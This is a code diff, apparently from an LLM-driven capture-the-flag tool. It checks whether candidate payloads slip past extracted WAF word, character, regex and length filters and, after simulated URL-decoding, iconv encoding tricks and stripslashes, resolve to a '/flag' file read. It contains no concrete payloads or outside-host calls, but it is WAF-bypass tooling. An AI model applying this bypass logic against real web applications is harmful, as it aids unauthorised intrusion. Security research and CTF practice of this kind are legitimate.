+            )
+        return results
+
+    @staticmethod
+    def _coerce_transform_chain_dict(transform_chain: Optional[object]) -> Dict[str, object]:
+        if transform_chain is None:
+            return {}
+        if hasattr(transform_chain, "as_dict"):
+            try:
+                data = transform_chain.as_dict()
+                return data if isinstance(data, dict) else {}
+            except Exception:
+                return {}
+        if isinstance(transform_chain, dict):
+            return transform_chain
+        return {}
+
+    def _validate_one_dataflow_payload(
+        self,
+        payload: str,
+        sink_kind: str,
+        payload_context: str,
+        flagfile: str,
+        chain: Dict[str, object],
+        waf_extraction: Optional[LlmWafExtraction],
+    ) -> PayloadValidationResult:
+        allowed, blocked_reason = self._dataflow_waf_allows(
+            payload,
+            payload_context,
+            waf_extraction,
+        )
+        if not allowed:
+            return PayloadValidationResult(
+                payload=payload,
+                sink_kind=sink_kind,
+                payload_context=payload_context,
+                attempted=True,
+                passed=False,
+                reason=f"raw payload is blocked before transform: {blocked_reason}",
+            )
+
+        transformed_values = self._simulate_dataflow_transforms(payload, chain)
+        target = (flagfile or "/flag").strip() or "/flag"
+        passed_value = ""
+        for value in transformed_values:
+            if self._dataflow_value_reaches_flag(value, target):
+                passed_value = value
+                break
+
+        if passed_value:
+            return PayloadValidationResult(
+                payload=payload,
+                sink_kind=sink_kind,
+                payload_context=payload_context,
+                attempted=True,
+                passed=True,
+                reason="dataflow transform reaches flag path before file read sink",
+                output_excerpt=passed_value,
+            )
+
+        return PayloadValidationResult(
+            payload=payload,
+            sink_kind=sink_kind,
+            payload_context=payload_context,
+            attempted=True,
+            passed=False,
+            reason="dataflow transform did not resolve to flag path",
+            output_excerpt=" | ".join(transformed_values[:5]),
+        )
+
+    @staticmethod
+    def _dataflow_waf_allows(
+        payload: str,
+        payload_context: str,
+        waf_extraction: Optional[LlmWafExtraction],
+    ) -> Tuple[bool, str]:
+        if waf_extraction is None:
+            return True, ""
+
+        values, byte_length = PureWafProjectAgent._filter_point_values(
+            payload,
+            payload_context,
+        )
+        for word in waf_extraction.waf_words:
+            lowered_word = word.lower() if word else ""
+            if lowered_word and any(lowered_word in value.lower() for value in values):
+                return False, f"word:{word}"
+        for ch in waf_extraction.waf_chars:
+            if ch and any(ch in value for value in values):
+                return False, f"char:{ch}"
+        for pattern in waf_extraction.waf_regex:
+            regex = PureWafProjectAgent._compile_waf_regex(pattern)
+            if regex is not None and any(regex.search(value) for value in values):
+                return False, f"regex:{pattern}"
+        if waf_extraction.limit_length is not None and byte_length > waf_extraction.limit_length:
+            return False, f"len>{waf_extraction.limit_length}"
+        return True, ""
+
+    @staticmethod
+    def _filter_point_values(payload: str, payload_context: str) -> Tuple[List[str], int]:
+        raw = str(payload or "")
+        context = str(payload_context or "any").strip().lower()
+        if context == "url_query_value":
+            try:
+                decoded_bytes = urllib.parse.unquote_to_bytes(raw.replace("+", " "))
+            except Exception:
+                decoded_bytes = raw.encode("utf-8", "replace")
+            values = [
+                decoded_bytes.decode("latin-1", "replace"),
+                decoded_bytes.decode("utf-8", "replace"),
+            ]
+            return list(dict.fromkeys(values)), len(decoded_bytes)
+        return [raw], len(raw.encode("utf-8", "replace"))
+
+    @staticmethod
+    def _compile_waf_regex(pattern: str):
+        literal = str(pattern or "").strip()
+        if not literal:
+            return None
+        flags = 0
+        if literal.startswith("/") and literal.count("/") >= 2:
+            last = literal.rfind("/")
+            flag_text = literal[last + 1 :]
+            literal = literal[1:last]
+            if "i" in flag_text:
+                flags |= re.I
+            if "s" in flag_text:
+                flags |= re.S
+            if "m" in flag_text:
+                flags |= re.M
+        try:
+            return re.compile(literal, flags)
+        except re.error:
+            return None
+
+    @staticmethod
+    def _simulate_dataflow_transforms(payload: str, chain: Dict[str, object]) -> List[str]:
+        raw = str(payload or "")
+        variants = [raw]
+        try:
+            decoded_bytes = urllib.parse.unquote_to_bytes(raw.replace("+", " "))
+            decoded_latin1 = decoded_bytes.decode("latin-1", "replace")
+            variants.append(urllib.parse.unquote(raw))
+            variants.append(decoded_latin1)
+        except Exception:
+            decoded_bytes = raw.encode("utf-8", "replace")
+
+        chain_text = PureWafProjectAgent._transform_chain_text(chain)
+        lowered = chain_text.lower()
+
+        if any(token in lowered for token in ("urldecode", "rawurldecode", "percent", "url decode")):
+            try:
+                variants.append(urllib.parse.unquote(raw))
+            except Exception:
+                pass
+
+        if any(token in lowered for token in ("iconv", "mb_convert_encoding", "encoding", "wide byte", "wide-byte", "utf-16")):
+            variants.extend(PureWafProjectAgent._decode_iconv_path_variants(decoded_bytes, chain))
+
+        if "stripslashes" in lowered or "backslash" in lowered:
+            variants.extend(value.replace("\\", "") for value in list(variants))
+
+        if "strtolower" in lowered:
+            variants.extend(value.lower() for value in list(variants))
+        if "strtoupper" in lowered:
+            variants.extend(value.upper() for value in list(variants))
+
+        return [
+            item
+            for item in _compact_value(list(dict.fromkeys(variants)), limit=500)
+            if isinstance(item, str) and item
+        ]
+
+    @staticmethod
+    def _transform_chain_text(chain: Dict[str, object]) -> str:
+        parts: List[str] = []
+        steps = chain.get("dataflow")
+        if isinstance(steps, list):
+            for step in steps:
+                if isinstance(step, dict):
+                    parts.extend(
+                        str(step.get(key, "") or "")
+                        for key in ("kind", "code", "function", "effect")
+                    )
+        hints = chain.get("strategy_hints")
+        if isinstance(hints, list):
+            parts.extend(str(item or "") for item in hints)
+        return " ".join(parts)
+
+    @staticmethod
+    def _decode_iconv_path_variants(data: bytes, chain: Dict[str, object]) -> List[str]:
+        variants: List[str] = []
+        encodings = PureWafProjectAgent._detect_iconv_source_encodings(chain)
+        variants.extend(PureWafProjectAgent._php_iconv_variants(data, encodings))
+
+        for encoding in encodings:
+            try:
+                decoded = data.decode(encoding.lower(), "ignore")
+                if decoded:
+                    variants.append(decoded)
+            except Exception:
+                continue
+
+        try:
+            utf8_ignore = data.decode("utf-8", "ignore")
+            if utf8_ignore:
+                variants.append(utf8_ignore)
+        except Exception:
+            pass
+
+        # Conservative fallback for iconv(..., "UTF-8//IGNORE") style paths:
+        # invalid/high bytes may be dropped, but NUL bytes are preserved unless
+        # the source shows an explicit NUL-stripping step.
+        ascii_keep_nul = "".join(chr(byte) for byte in data if byte == 0 or 0x20 <= byte < 0x7F)
+        if ascii_keep_nul:
+            variants.append(ascii_keep_nul)
+        if PureWafProjectAgent._chain_explicitly_strips_nuls(chain):
+            stripped = ascii_keep_nul.replace("\x00", "")
+            if stripped:
+                variants.append(stripped)
+        return list(dict.fromkeys(variants))
+
+    @staticmethod
+    def _detect_iconv_source_encodings(chain: Dict[str, object]) -> List[str]:
+        text = PureWafProjectAgent._transform_chain_text(chain)
+        known = [
+            "ISO-2022-CN-EXT",
+            "UTF-8",
+            "GBK",
+            "BIG5",
+            "UTF-16",
+            "UTF-16LE",
+            "UTF-16BE",
+            "ISO-8859-1",
+        ]
+        found = [encoding for encoding in known if encoding.lower() in text.lower()]
+        if found:
+            return found
+        return ["UTF-8", "ISO-2022-CN-EXT"]
+
+    @staticmethod
+    def _php_iconv_variants(data: bytes, encodings: Sequence[str]) -> List[str]:
+        php_bin = shutil.which("php")
+        if not php_bin:
+            return []
+        encoded = base64.b64encode(data).decode("ascii")
+        enc_json = json.dumps(list(dict.fromkeys(encodings)))
+        script = (
+            "<?php\n"
+            f"$data = base64_decode('{encoded}');\n"
+            f"$encodings = json_decode('{enc_json}', true);\n"
+            "$out = [];\n"
+            "foreach ($encodings as $enc) {\n"
+            "    $v = @iconv($enc, 'UTF-8//IGNORE', $data);\n"
+            "    if ($v !== false && $v !== '') { $out[] = $v; }\n"
+            "}\n"
+            "echo json_encode(array_values(array_unique($out)), JSON_UNESCAPED_UNICODE);\n"
+        )
+        try:
+            proc = subprocess.run(
+                [php_bin],
+                input=script.encode("utf-8"),
+                stdout=subprocess.PIPE,
+                stderr=subprocess.DEVNULL,
+                check=False,
+                timeout=VALIDATION_TIMEOUT_SECONDS,
+            )
+            parsed = json.loads(proc.stdout.decode("utf-8", "replace") or "[]")
+        except Exception:
+            return []
+        return [str(item) for item in parsed if isinstance(item, str) and item]
+
+    @staticmethod
+    def _chain_explicitly_strips_nuls(chain: Dict[str, object]) -> bool:
+        text = PureWafProjectAgent._transform_chain_text(chain).lower()
+        nul_markers = ("\\0", "\\x00", "null byte", "nul byte", "nuls")
+        strip_markers = ("str_replace", "replace", "remove", "strip")
+        return any(marker in text for marker in nul_markers) and any(
+            marker in text for marker in strip_markers
+        )
+
+    @staticmethod
+    def _dataflow_value_reaches_flag(value: str, target: str) -> bool:
+        normalized = str(value or "").replace("\\", "/").strip()
+        if "\x00" in normalized:
+            return False
+        target_norm = (target or "/flag").replace("\\", "/").strip() or "/flag"
+        if normalized == target_norm:
+            return True
+        if normalized in {"flag", "/flag"}:
+            return True
+        if normalized.endswith(target_norm):
+            return True
+        lowered = normalized.lower()
+        if "resource=" in lowered:
+            resource = lowered.rsplit("resource=", 1)[-1]
+            return resource in {"flag", "/flag"} or resource.endswith("/flag")
+        return False
 
     def _record_validation_results(self, results: Sequence[PayloadValidationResult]):
         if self.session:
@@ -1294,11 +2276,42 @@ echo $out;
     @staticmethod
     def _parse_payload_review(content: str) -> LlmPayloadReview:
         parsed = PureWafLlmSinkAgent._load_json_content(content)
+        payload_value = str(parsed.get("payload_value", "") or "").strip()[:1000]
+        fallback_payload = str(parsed.get("fallback_payload", "") or "").strip()[:1000]
+        if not payload_value and fallback_payload:
+            payload_value = fallback_payload
+        if not fallback_payload and payload_value:
+            fallback_payload = payload_value
         return LlmPayloadReview(
             valid=bool(parsed.get("valid", False)),
-            fallback_payload=str(parsed.get("fallback_payload", "") or "").strip()[:1000],
+            fallback_payload=fallback_payload,
+            payload_value=payload_value,
+            request_path=str(parsed.get("request_path", "") or "").strip()[:1000],
+            request_headers=PureWafProjectAgent._parse_string_dict(
+                parsed.get("request_headers", parsed.get("headers", {})),
+                value_limit=1200,
+            ),
+            request_cookies=PureWafProjectAgent._parse_string_dict(
+                parsed.get("request_cookies", parsed.get("cookies", {})),
+                value_limit=1200,
+            ),
+            payload_context=str(parsed.get("payload_context", "") or "").strip()[:80],
+            source=str(parsed.get("source", "") or "").strip()[:80],
+            evidence=str(parsed.get("evidence", "") or "").strip()[:600],
             notes=str(parsed.get("notes", "") or "").strip()[:500],
         )
+
+    @staticmethod
+    def _parse_string_dict(raw, value_limit: int = 500) -> Dict[str, str]:
+        if not isinstance(raw, dict):
+            return {}
+        out: Dict[str, str] = {}
+        for key, value in list(raw.items())[:20]:
+            clean_key = re.sub(r"[\r\n:]+", "", str(key or "")).strip()[:120]
+            clean_value = re.sub(r"[\r\n]+", " ", str(value or "")).strip()[:value_limit]
+            if clean_key and clean_value:
+                out[clean_key] = clean_value
+        return out
 
     def generate_custom_command_bypass(
         self,
